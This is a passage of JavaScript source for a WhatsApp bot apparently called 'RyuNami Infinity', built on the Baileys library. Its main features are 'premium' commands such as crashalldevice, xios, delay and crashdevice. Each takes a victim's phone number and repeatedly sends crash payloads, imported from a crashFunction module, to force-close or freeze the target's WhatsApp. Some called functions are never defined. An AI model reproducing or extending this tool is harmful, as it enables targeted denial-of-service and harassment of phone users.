console.clear();
require('./setting/config')

const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia } = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { GroupSettingChange, WAGroupMetadata, emitGroupParticipantsUpdate, emitGroupUpdate, WAGroupInviteMessageGroupMetadata, GroupMetadata, Headers, WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageContent, areJidsSameUser, useMultiFileAuthState, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket, makeInMemoryStore, MediaType, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, initInMemoryKeyStore, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, templateMessage, InteractiveMessage, Header, getUSyncDevices } = require("@whiskeysockets/baileys");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const jimp = require("jimp")
const axios = require('axios')
const fsx = require('fs-extra')
const sharp = require('sharp')
const crypto = require('crypto')
const yts = require('yt-search')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const jsobfus = require('javascript-obfuscator');
const { ocrSpace } = require("ocr-space-api-wrapper");
const { JSDOM } = require('jsdom')
const { spawn, exec, execSync } = require('child_process')

const fakeMenu = './setting/fakemenu.jpg';
const doxButtons = fs.readFileSync('./setting/document.jpg')

const { FcLeoPayx, DelayDuration, callCrash, exoticsIPV2, ExploitPayloadApi } = require('./controlMsg/crashFunction');

module.exports = sock = async (sock, m, chatUpdate, store) => {
try {
var body = (m.mtype === "conversation" ? m.message.conversation || "[Conversation]" : m.mtype === "imageMessage" ? m.message.imageMessage.caption || "[Image]" : m.mtype === "videoMessage" ? m.message.videoMessage.caption || "[Video]" : m.mtype === "audioMessage" ? m.message.audioMessage.caption || "[Audio]" : m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "[Sticker]" : m.mtype === "documentMessage" ? m.message.documentMessage.fileName || "[Document]" : m.mtype === "contactMessage" ? "[Contact]" : m.mtype === "locationMessage" ? m.message.locationMessage.name || "[Location]" : m.mtype === "liveLocationMessage" ? "[Live Location]" : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text || "[Extended Text]" : m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId || "[Button Response]" : m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId || "[List Response]" : m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId || "[Template Button Reply]" : m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson)?.id || "[Interactive Response]" : m.mtype === "pollCreationMessage" ? "[Poll Creation]" : m.mtype === "reactionMessage" ? m.message.reactionMessage.text || "[Reaction]" : m.mtype === "ephemeralMessage" ? "[Ephemeral]" : m.mtype === "viewOnceMessage" ? "[View Once]" : m.mtype === "productMessage" ? m.message.productMessage.product?.name || "[Product]" : m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text || "[Message Context]" : "[Unknown Type]");
var budy = (typeof m.text == 'string' ? m.text : '');
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdm, generateProfilePicture } = require('./controlMsg/msgFunction')
const Owner = JSON.parse(fs.readFileSync('./accesDatabase/ownerData.json'))
const Premium = JSON.parse(fs.readFileSync('./accesDatabase/premiumData.json'))
const CMD = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const BotNum = await sock.decodeJid(sock.user.id)
const CreatorOnly = [BotNum, ...Owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const PremOnly = [BotNum, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const fatkuns = m.quoted || m;
const quoted = fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] : fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m;
const text = q = args.join(" ")
const qtek = m.quoted && m.quoted.message && m.quoted.message.imageMessage;
const from = m.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await sock.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = m.isGroup ? await groupMetadata.participants : ''
const GroupAdm = m.isGroup ? await getGroupAdm(participants) : ''
const BotAdm = m.isGroup ? GroupAdm.includes(BotNum) : false
const Adm = m.isGroup ? GroupAdm.includes(m.sender) : false
const pushname = m.pushName || "No Name"
const mime = (quoted.msg || quoted).mimetype || ''
		
if (!sock.public) {
	if (!CreatorOnly) return
}

const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}

const lol = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net", 
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2008",
      thumbnail: sock,
      itemCount: "122",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `𝗩𝗲𝗿𝘀𝗶𝗼𝗻 3 𝗩𝗶𝗽`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

const ReplyButton = (teks) => {
  const buttons = [
    {
    buttonId: '.menu',
    buttonText: {
      displayText: 'Back'
      }
    }
  ];

  const buttonMessage = {
    image: { url: "https://files.catbox.moe/uhxi4x.jpg" },
    caption: teks,
    footer: '『 𝑿𝒛𝑹𝒊𝒏𝒙 † 𝑹𝒚𝒖𝑵𝒂𝒎𝒊 𝑰𝒏𝒇𝒊𝒏𝒊𝒕𝒚 』',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363423258031305@newsletter",
        serverMessageId: null,
        newsletterName: `𝑿𝒛𝑹𝒊𝒏𝒙 ?¿`
      },
      mentionedJid: ['13135550002@s.whatsapp.net'],
    },
    viewOnce: true
   };

  return sock.sendMessage(m.chat, buttonMessage, { quoted: lol });
}

if (command) {
    if (m.isGroup) {
        console.log(chalk.keyword("orange").bold(`\n👀  GROUP MESSAGE`));
        console.log(chalk.red(`[ ϟ ] `) + chalk.cyan.bold(`(msg) `) + chalk.green.bold(`${prefix + command} : `) + chalk.yellow.bold(`${m.mtype}`));
    } else {
        console.log(chalk.keyword("orange").bold(`\n👀  PRIVATE MESSAGE`));
        console.log(chalk.red(`[ ϟ ] `) + chalk.cyan.bold(`(msg) `) + chalk.green.bold(`${prefix + command} : `) + chalk.yellow.bold(`${m.mtype}`));
    }
}

switch (command) {
case 'menu': {

function getMemoryUsage() {
  const used = process.memoryUsage()
  return Math.round(used.rss / 1024 / 1024 * 100) / 100
}

function getResponseTime() {
  const now = Date.now()
  const messageTime = (m.messageTimestamp?.low || m.messageTimestamp || 0) * 1000
  return now - messageTime
}

const responseTime = getResponseTime()
const memory = getMemoryUsage()
const currentDate = new Date().toLocaleDateString('en-US', {
  year: 'numeric',
  month: 'long',
  day: 'numeric'
})

let loading = await m.reply('▰□□□□□□□ 0%')

const progress = [
  '▰□□□□□□□ 10%',
  '▰▰□□□□□□ 20%',
  '▰▰▰□□□□□ 30%',
  '▰▰▰▰□□□□ 40%',
  '▰▰▰▰▰□□□ 50%',
  '▰▰▰▰▰▰□□ 60%',
  '▰▰▰▰▰▰▰□ 70%',
  '▰▰▰▰▰▰▰▰ 80%',
  '▰▰▰▰▰▰▰▰▰ 90%',
  '▰▰▰▰▰▰▰▰▰▰ 100%'
]

for (const p of progress) {
  await new Promise(r => setTimeout(r, 280))
  await sock.sendMessage(
    m.chat,
    { text: `⏳ ${p}`, edit: loading.key }
  )
}

await sock.sendMessage(
  m.chat,
  { delete: loading.key }
)

await sock.sendMessage(
  m.chat,
  {
    image: { url: fakeMenu },
    caption: `\`｢ 🎩 ｣ RyuNami † Infinity\`
◉ *Developer : XzRinx*
◉ *Version : 1.0*
◉ *Runtime : ${os.platform()} ${os.arch()}*
◉ *Nodes : ${process.version}*
◉ *Date : ${currentDate}*`,
    footer: "Telegram : @xzrinx",
    headerType: 4,
    viewOnce: true,

    buttons: [
      {
        buttonId: 'action',
        type: 4,
        viewOnce: true,
        buttonText: {
          displayText: '† TRASHER'
        },
        nativeFlowInfo: {
          name: 'single_select',
          paramsJson: JSON.stringify({
            title: '  ',
            sections: [
              {
                highlight_label: "FORCLOSE NEW",
                title: '🩸 RYUNAMI INFINITY TRASH',
                rows: [
                  {
                    title: '📞 ☇ crash - call(node-sfx)',
                    description: '- Type bug this spammer crash',
                    id: 'crashalldevice'
                  }
                ]
              },
              {
                highlight_label: "TOOLS MENU",
                rows: [
                  {
                    title: '🕊 Tools Xz',
                    description: '- Type Menu Tools',
                    id: 'toolsmen'
                  }
                ]
              },
              {
                highlight_label: "FORCLOSE DELETE",
                rows: [
                  {
                    title: '🦋 ☇ crash - delete(delete text)',
                    description: '- Type bug this crasher delete',
                    id: 'xios'
                  }
                ]
              }
            ]
          })
        }
      }
    ]
  },
  {
    quoted: {
      key: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: "ownername",
        participant: "0@s.whatsapp.net"
      },
      message: {
        requestPaymentMessage: {
          currencyCodeIso4217: "USD",
          amount1000: "999999999",
          requestFrom: "0@s.whatsapp.net",
          noteMessage: {
            extendedTextMessage: {
              text: "🎩 Маг † Рюнами"
            }
          },
          expiryTimestamp: "999999999",
          amount: {
            value: "91929291929",
            offset: "1000",
            currencyCode: "INR"
          }
        }
      }
    }
  }
)

}
break

case 'toolsmen': {

function getMemoryUsage() {
  const used = process.memoryUsage()
  return Math.round(used.rss / 1024 / 1024 * 100) / 100
}

function getResponseTime() {
  const now = Date.now()
  const messageTime = (m.messageTimestamp?.low || m.messageTimestamp || 0) * 1000
  return now - messageTime
}

const responseTime = getResponseTime()
const memory = getMemoryUsage()
const currentDate = new Date().toLocaleDateString('en-US', {
  year: 'numeric',
  month: 'long',
  day: 'numeric'
})

let loadMsg = await m.reply('▰□□□□□□□ 0%')

const bars = [
  '▰□□□□□□□ 10%',
  '▰▰□□□□□□ 20%',
  '▰▰▰□□□□□ 30%',
  '▰▰▰▰□□□□ 40%',
  '▰▰▰▰▰□□□ 50%',
  '▰▰▰▰▰▰□□ 60%',
  '▰▰▰▰▰▰▰□ 70%',
  '▰▰▰▰▰▰▰▰ 80%',
  '▰▰▰▰▰▰▰▰▰ 90%',
  '▰▰▰▰▰▰▰▰▰▰ 100%'
]

for (const bar of bars) {
  await new Promise(r => setTimeout(r, 350))
  await sock.sendMessage(
    m.chat,
    { text: `⏳ ${bar}`, edit: loadMsg.key }
  )
}

await sock.sendMessage(
  m.chat,
  { delete: loadMsg.key }
)

await sock.sendMessage(
  m.chat,
  {
    image: { url: fakeMenu },
    caption: `\`｢ † ｣ RyuNami Infinty\`
◉ ${prefix}upswgc
◉ ${prefix}upswpribadi
◉ ${prefix}reactch
◉ ${prefix}tourl
◉ ${prefix}brat
◉ ${prefix}rvo
◉ ${prefix}iqc
◉ ${prefix}trackip`,
    buttons: [
      {
        buttonId: `${prefix}menu`,
        buttonText: { displayText: '🔙 Back To Menu' },
        type: 1
      }
    ],
    headerType: 4
  },
  { quoted: m }
)

}
break

case 'crashalldevice': {
    if (!PremOnly)
        return m.reply(`
╭▢ *☇ PREMIUM ACCESS REQUIRED*
│
│ This feature is exclusive for
│ Premium users only.
│
│ Upgrade your access to unlock
│ advanced execution features.
╰───────────────
`);

    if (!q)
        return m.reply(`
╭▢ *☇ SYNTAX ERROR*
│
│ Missing target number.
│
│ ◉ Usage:
│ • ${command} <international_number>
│
│ ◉ Example:
│ • ${command} 628123456789
╰───────────────
`);

    const jidx = q.replace(/[^0-9]/g, "");

    if (
        jidx.startsWith("0") ||
        jidx.length < 8 ||
        jidx.length > 15
    ) {
        return m.reply(`
╭▢ *☇ INVALID TARGET NUMBER*
│
│ The provided number does not
│ match international standards.
│
│ ❀ Requirements:
│ • International format only
│ • Must not start with 0
│ • Digits only (no symbols)
│ • Length: 8 – 15 digits
│
│ ❀ Valid Examples:
│ • ${command} 628123456789
│ • ${command} 60123456789
│ • ${command} 447911123456
╰───────────────
`);
    }

    const isTarget = `${jidx}@s.whatsapp.net`;

    m.reply(`
╭▢ *☇ PREMIUM EXECUTION INITIALIZED*
│
│ ❀ Target : ${jidx}
│ ❀ Mode : Crash All Device
│ ❀ Status : Processing
│
│ Please wait while the system
│ performs the execution.
╰───────────────
`);

    let success = 0;
    let failed = 0;

    for (let i = 0; i < 100; i++) {
        try {
            await FcLeoPayx(sock, isTarget);
            success++;
        } catch (err) {
            failed++;
            console.log(
                chalk.blue(`❗ Execution failed (loop ${i + 1})`),
                err
            );
        }
    }

    m.reply(`
╭─〔 ✅ ☇ EXECUTION REPORT 〕
│
│ ◉ Target : ${jidx}
│ ◉ Success : ${success}
│ ◉ Failed : ${failed}
│ ◉ Status : Completed
│
│ Thank you for using our
│ Premium Execution Service.
╰───────────────
`);
}
break;

case 'xios': {
    if (!PremOnly)
        return m.reply(`
╭─〔 🔒 ☇ PREMIUM ACCESS REQUIRED 〕
│
│ This feature is exclusive for
│ Premium users only.
│
│ Upgrade your access to unlock
│ advanced execution features.
╰───────────────
`);

    if (!q)
        return m.reply(`
╭─〔 ❌ ☇ SYNTAX ERROR 〕
│
│ Missing target number.
│
│ ◉ Usage:
│ • ${command} <international_number>
│
│ ◉ Example:
│ • ${command} 628123456789
╰───────────────
`);

    const jidx = q.replace(/[^0-9]/g, "");

    if (
        jidx.startsWith("0") ||
        jidx.length < 8 ||
        jidx.length > 15
    ) {
        return m.reply(`
╭─〔 ❌ ☇ INVALID TARGET NUMBER 〕
│
│ The provided number does not
│ match international standards.
│
│ ◉ Requirements:
│ • International format only
│ • Must not start with 0
│ • Digits only (no symbols)
│ • Length: 8 – 15 digits
│
│ ◉ Valid Examples:
│ • ${command} 628123456789
│ • ${command} 60123456789
│ • ${command} 447911123456
╰───────────────
`);
    }

    const isTarget = `${jidx}@s.whatsapp.net`;

    m.reply(`
╭─〔 ✅ ☇ PREMIUM EXECUTION INITIALIZED 〕
│
│ ◉ Target : ${jidx}
│ ◉ Mode : IPhone Invisible
│ ◉ Status : Processing
│
│ Please wait while the system
│ performs the execution.
╰───────────────
`);

    let success = 0;
    let failed = 0;

    for (let i = 0; i < 400; i++) {
        try {
            await exoticsIPV2(sock, isTarget);
            await sleep(500);
            success++;
        } catch (err) {
            failed++;
            console.log(
                chalk.blue(`❗ Execution failed (loop ${i + 1})`),
                err
            );
        }
    }

    m.reply(`
╭─〔 ✅ ☇ EXECUTION REPORT 〕
│
│ ◉ Target : ${jidx}
│ ◉ Success : ${success}
│ ◉ Failed : ${failed}
│ ◉ Status : Completed
│
│ Thank you for using our
│ Premium Execution Service.
╰───────────────
`);
}
break;

case 'fcclickinf': {
    if (!PremOnly)
        return m.reply(`
╭─〔 🔒 ☇ PREMIUM ACCESS REQUIRED 〕
│
│ This feature is exclusive for
│ Premium users only.
│
│ Upgrade your access to unlock
│ advanced execution features.
╰───────────────
`);

    if (!q)
        return m.reply(`
╭─〔 ❌ ☇ SYNTAX ERROR 〕
│
│ Missing target number.
│
│ ◉ Usage:
│ • ${command} <international_number>
│
│ ◉ Example:
│ • ${command} 628123456789
╰───────────────
`);

    const jidx = q.replace(/[^0-9]/g, "");

    if (
        jidx.startsWith("0") ||
        jidx.length < 8 ||
        jidx.length > 15
    ) {
        return m.reply(`
╭─〔 ❌ ☇ INVALID TARGET NUMBER 〕
│
│ The provided number does not
│ match international standards.
│
│ ◉ Requirements:
│ • International format only
│ • Must not start with 0
│ • Digits only (no symbols)
│ • Length: 8 – 15 digits
│
│ ◉ Valid Examples:
│ • ${command} 628123456789
│ • ${command} 60123456789
│ • ${command} 447911123456
╰───────────────
`);
    }

    const isTarget = `${jidx}@s.whatsapp.net`;

    m.reply(`
╭─〔 ✅ ☇ PREMIUM EXECUTION INITIALIZED 〕
│
│ ◉ Target : ${jidx}
│ ◉ Mode : Delay Invisible
│ ◉ Status : Processing
│
│ Please wait while the system
│ performs the execution.
╰───────────────
`);

    let success = 0;
    let failed = 0;

    for (let i = 0; i < 100; i++) {
        try {
            await IndicatedFc(sock, isTarget);
            await sleep(500);
            success++;
        } catch (err) {
            failed++;
            console.log(
                chalk.blue(`❗ Execution failed (loop ${i + 1})`),
                err
            );
        }
    }

    m.reply(`
╭─〔 ✅ ☇ EXECUTION REPORT 〕
│
│ ◉ Target : ${jidx}
│ ◉ Success : ${success}
│ ◉ Failed : ${failed}
│ ◉ Status : Completed
│
│ Thank you for using our
│ Premium Execution Service.
╰───────────────
`);
}
break;

case 'delay': {
    if (!PremOnly)
        return m.reply(`
╭─〔 🔒 ☇ PREMIUM ACCESS REQUIRED 〕
│
│ This feature is exclusive for
│ Premium users only.
│
│ Upgrade your access to unlock
│ advanced execution features.
╰───────────────
`);

    if (!q)
        return m.reply(`
╭─〔 ❌ ☇ SYNTAX ERROR 〕
│
│ Missing target number.
│
│ ◉ Usage:
│ • ${command} <international_number>
│
│ ◉ Example:
│ • ${command} 628123456789
╰───────────────
`);

    const jidx = q.replace(/[^0-9]/g, "");

    if (
        jidx.startsWith("0") ||
        jidx.length < 8 ||
        jidx.length > 15
    ) {
        return m.reply(`
╭─〔 ❌ ☇ INVALID TARGET NUMBER 〕
│
│ The provided number does not
│ match international standards.
│
│ ◉ Requirements:
│ • International format only
│ • Must not start with 0
│ • Digits only (no symbols)
│ • Length: 8 – 15 digits
│
│ ◉ Valid Examples:
│ • ${command} 628123456789
│ • ${command} 60123456789
│ • ${command} 447911123456
╰───────────────
`);
    }

    const isTarget = `${jidx}@s.whatsapp.net`;

    m.reply(`
╭─〔 ✅ ☇ PREMIUM EXECUTION INITIALIZED 〕
│
│ ◉ Target : ${jidx}
│ ◉ Mode : Delay Invisible
│ ◉ Status : Processing
│
│ Please wait while the system
│ performs the execution.
╰───────────────
`);

    let success = 0;
    let failed = 0;

    for (let i = 0; i < 500; i++) {
        try {
            await ExploitPayloadApi(isTarget, ptcp = true);
            await sleep(500);
            success++;
        } catch (err) {
            failed++;
            console.log(
                chalk.blue(`❗ Execution failed (loop ${i + 1})`),
                err
            );
        }
    }

    m.reply(`
╭─〔 ✅ ☇ EXECUTION REPORT 〕
│
│ ◉ Target : ${jidx}
│ ◉ Success : ${success}
│ ◉ Failed : ${failed}
│ ◉ Status : Completed
│
│ Thank you for using our
│ Premium Execution Service.
╰───────────────
`);
}
break;

case 'crashdevice': {
    if (!PremOnly)
        return m.reply(`
╭─〔 🔒 ☇ PREMIUM ACCESS REQUIRED 〕
│
│ This feature is exclusive for
│ Premium users only.
│
│ Upgrade your access to unlock
│ advanced execution features.
╰───────────────
`);

    if (!q)
        return m.reply(`
╭─〔 ❌ ☇ SYNTAX ERROR 〕
│
│ Missing target number.
│
│ ◉ Usage:
│ • ${command} <international_number>
│
│ ◉ Example:
│ • ${command} 628123456789
╰───────────────
`);

    const jidx = q.replace(/[^0-9]/g, "");

    if (
        jidx.startsWith("0") ||
        jidx.length < 8 ||
        jidx.length > 15
    ) {
        return m.reply(`
╭─〔 ❌ ☇ INVALID TARGET NUMBER 〕
│
│ The provided number does not
│ match international standards.
│
│ ◉ Requirements:
│ • International format only
│ • Must not start with 0
│ • Digits only (no symbols)
│ • Length: 8 – 15 digits
│
│ ◉ Valid Examples:
│ • ${command} 628123456789
│ • ${command} 60123456789
│ • ${command} 447911123456
╰───────────────
`);
    }

    const isTarget = `${jidx}@s.whatsapp.net`;

    m.reply(`
╭─〔 ✅ ☇ PREMIUM EXECUTION INITIALIZED 〕
│
│ ◉ Target : ${jidx}
│ ◉ Mode : Crashdevice Invisible
│ ◉ Status : Processing
│
│ Please wait while the system
│ performs the execution.
╰───────────────
`);

    let success = 0;
    let failed = 0;

    for (let i = 0; i < 500; i++) {
        try {
            await SemestaOneHit(sock, isTarget);
            await sleep(500);
            success++;
        } catch (err) {
            failed++;
            console.log(
                chalk.blue(`❗ Execution failed (loop ${i + 1})`),
                err
            );
        }
    }

    m.reply(`
╭─〔 ✅ ☇ EXECUTION REPORT 〕
│
│ ◉ Target : ${jidx}
│ ◉ Success : ${success}
│ ◉ Failed : ${failed}
│ ◉ Status : Completed
│
│ Thank you for using our
│ Premium Execution Service.
╰───────────────
`);
}
break;

case 'addowner':
case 'addown': {
    if (!CreatorOnly) {
        return m.reply(
`⚠️ ☇ *Akses Ditolak / Access Denied*

Anda tidak memiliki izin untuk menjalankan perintah ini.
You do not have permission to execute this command.`
        );
    }

    if (!args[0]) {
        return m.reply(
`❗ ☇ *Format Perintah Tidak Valid / Invalid Command Format*

Gunakan format berikut:
• *${prefix + command} <nomor>*
Contoh:
• *${prefix + command} 628123456789*

Use the following format:
• *${prefix + command} <number>*
Example:
• *${prefix + command} 628123456789*`
        );
    }

    let numero = text.split("|")[0].replace(/[^0-9]/g, '');
    let loadnum = await sock.onWhatsApp(numero + `@s.whatsapp.net`);

    if (!loadnum || loadnum.length === 0) {
        return m.reply(
`❗ ☇ *Nomor Tidak Valid / Invalid Number*

Nomor yang Anda masukkan tidak terdaftar di WhatsApp.
The number you entered is not registered on WhatsApp.`
        );
    }

    owner.push(numero);
    Premium.push(numero);

    fs.writeFileSync('./accesDatabase/ownerData.json', JSON.stringify(owner));
    fs.writeFileSync('./accesDatabase/premiumData.json', JSON.stringify(Premium));

    return m.reply(
`✅ ☇ *Owner Added Successfully*

📌 ☇ *Nomor:* ${numero}
Nomor berhasil ditambahkan sebagai *Owner* dan *Premium User*.
The number has been added as an *Owner* and *Premium User*.`
    );
}
break;

case 'delowner':
case 'delown': {
    if (!CreatorOnly) {
        return m.reply(
`⚠️ ☇ *Akses Ditolak / Access Denied*

Anda tidak memiliki izin untuk menjalankan perintah ini.
You do not have permission to execute this command.`
        );
    }

    if (!args[0]) {
        return m.reply(
`❗ ☇ *Format Perintah Tidak Valid / Invalid Command Format*

Gunakan format berikut:
• *${prefix + command} <nomor>*
Contoh:
• *${prefix + command} 628123456789*

Use the following format:
• *${prefix + command} <number>*
Example:
• *${prefix + command} 628123456789*`
        );
    }

    let numero2 = text.split("|")[0].replace(/[^0-9]/g, '');
    let ownerIndex = Owner.indexOf(numero2);
    let premiumIndex = Premium.indexOf(numero2);

    if (ownerIndex === -1 && premiumIndex === -1) {
        return m.reply(
`❗ ☇ *Nomor Tidak Ditemukan / Number Not Found*

Nomor tersebut tidak terdaftar sebagai Owner atau Premium.
The number is not registered as an Owner or Premium.`
        );
    }

    if (ownerIndex !== -1) Owner.splice(ownerIndex, 1);
    if (premiumIndex !== -1) Premium.splice(premiumIndex, 1);

    fs.writeFileSync('./accesDatabase/ownerData.json', JSON.stringify(Owner));
    fs.writeFileSync('./accesDatabase/premiumData.json', JSON.stringify(Premium));

    return m.reply(
`✅ ☇ *Owner Removed Successfully*

📌 ☇ *Nomor:* ${numero2}
Nomor berhasil dihapus dari database Owner & Premium.
The number has been successfully removed from Owner & Premium database.`
    );
}
break;

case 'addpremium':
case 'addprem': {
    if (!CreatorOnly) {
        return m.reply(
`⚠️ ☇ *Akses Ditolak / Access Denied*

Anda tidak memiliki izin untuk menggunakan perintah ini.
You do not have permission to execute this command.`
        );
    }

    if (!args[0]) {
        return m.reply(
`❗ ☇ *Format Tidak Valid / Invalid Format*

Gunakan format berikut:
• *${prefix + command} <nomor>*
Contoh:
• *${prefix + command} 628123456789*

Use this format:
• *${prefix + command} <number>*
Example:
• *${prefix + command} 628123456789*`
        );
    }

    let numero = text.split("|")[0].replace(/[^0-9]/g, '');
    let check = await sock.onWhatsApp(numero + `@s.whatsapp.net`);

    if (!check || check.length === 0) {
        return m.reply(
`❗ ☇ *Nomor Tidak Valid / Invalid Number*

Nomor tersebut tidak terdaftar di WhatsApp.
The number is not registered on WhatsApp.`
        );
    }

    Premium.push(numero);
    fs.writeFileSync('./accesDatabase/premiumData.json', JSON.stringify(Premium));

    return m.reply(
`✅ *Premium User Added Successfully*

📌 ☇ *Nomor:* ${numero}
Nomor berhasil ditambahkan sebagai *Premium User*.
The number has been added as a *Premium User*.`
    );
}
break;

case 'delpremium':
case 'delprem': {
    if (!CreatorOnly) {
        return m.reply(
`⚠️ ☇ *Akses Ditolak / Access Denied*

Anda tidak memiliki izin untuk menggunakan perintah ini.
You do not have permission to execute this command.`
        );
    }

    if (!args[0]) {
        return m.reply(
`❗ ☇ *Format Tidak Valid / Invalid Format*

Gunakan format berikut:
• *${prefix + command} 628xxxx*

Use this format:
• *${prefix + command} 628xxxx*`
        );
    }

    let numero2 = text.split("|")[0].replace(/[^0-9]/g, '');
    let idx = Premium.indexOf(numero2);

    if (idx === -1) {
        return m.reply(
`❗ ☇ *Nomor Tidak Ditemukan / Number Not Found*

Nomor tersebut tidak terdaftar sebagai Premium.
The number is not listed as a Premium user.`
        );
    }

    Premium.splice(idx, 1);
    fs.writeFileSync('./accesDatabase/premiumData.json', JSON.stringify(Premium));

    return m.reply(
`✅ ☇ *Premium User Removed Successfully*

📌 *Nomor:* ${numero2}
Nomor berhasil dihapus dari daftar Premium.
The number has been successfully removed from Premium list.`
    );
}
break;

case 'public': {
    if (!CreatorOnly) {
        return m.reply(
`⚠️ ☇ *Akses Ditolak / Access Denied*
Anda bukan owner.

You are not the owner.`
        );
    }

    sock.public = true;

    return m.reply(
`✅ ☇ *Mode Updated Successfully*

Bot telah diubah ke mode *Public*.
The bot is now running in *Public Mode*.`
    );
}
break;

case 'self':
case 'private': {
    if (!CreatorOnly) {
        return m.reply(
`⚠️ ☇ *Akses Ditolak / Access Denied*
Anda bukan owner.

You are not the owner.`
        );
    }

    sock.public = false;

    return m.reply(
`✅ ☇ *Mode Updated Successfully*

Bot telah diubah ke mode *Self Private*.
The bot is now running in *Self Private Mode*.`
    );
}
break;

case 'upswgroup':
case 'upswgc': {
    try {
        if (!m.isGroup) return m.reply("❌ Command ini hanya bisa dipakai di grup!");

        const metadata = await sock.groupMetadata(m.chat);
        const participants = metadata.participants || [];

        const senderJid = m.sender.replace(/:\d+/, '');
        const botJid = sock.user.id.replace(/:\d+/, '');

        const isAdmin = participants.some(p =>
            p.id.replace(/:\d+/, '') === senderJid && p.admin
        );

        const isOwner = senderJid === botJid;

        const fullText =
            m.text ||
            m.body ||
            m.message?.conversation ||
            m.message?.extendedTextMessage?.text ||
            args?.join(" ") ||
            "";

        const input = fullText.replace(prefix + command, "").trim();
        const q = m.quoted;

        if (!input && !q) {
            return m.reply(
                `📖 *Cara Upload Status Grup*\n\n` +
                `• ${prefix + command} teks, idgrup@g.us\n` +
                `• Reply media + ${prefix + command} idgrup@g.us\n` +
                `• Jalankan di dalam grup → otomatis pakai grup itu`
            );
        }

        let isiPesan = "";
        let idGrup = "";

        if (input.includes(",")) {
            const split = input.split(",");
            isiPesan = split.slice(0, -1).join(",").trim();
            idGrup = split.slice(-1)[0].trim();
        } else if (/@g\.us$/i.test(input)) {
            idGrup = input.trim();
        } else {
            isiPesan = input;
        }

        if (!idGrup || !idGrup.endsWith("@g.us")) {
            idGrup = m.chat;
        }

        let mime = (q?.msg || q)?.mimetype || q?.mimetype || "";
        let buffer, content;

        await sock.sendMessage(m.chat, {
            react: { text: "⏳", key: m.key }
        });

        if (q && /image|video|audio|sticker|document/.test(mime)) {
            buffer = await q.download().catch(() => null);
        }

        if (buffer) {
            if (/image/.test(mime)) {
                content = { image: buffer, caption: isiPesan || q.caption || "" };
            } else if (/video/.test(mime)) {
                content = { video: buffer, caption: isiPesan || q.caption || "" };
            } else if (/audio/.test(mime)) {
                content = { audio: buffer, mimetype: "audio/mpeg", ptt: false };
            } else if (/sticker/.test(mime)) {
                content = { sticker: buffer };
            } else if (/document/.test(mime)) {
                content = {
                    document: buffer,
                    mimetype: q.mimetype,
                    fileName: q.fileName || "file"
                };
            }
        } else if (isiPesan) {
            content = { text: isiPesan };
        } else {
            return m.reply("❌ Tidak ada teks atau media!");
        }

        const {
            generateWAMessageContent,
            generateWAMessageFromContent
        } = require("@whiskeysockets/baileys");

        const inside = await generateWAMessageContent(content, {
            upload: sock.waUploadToServer
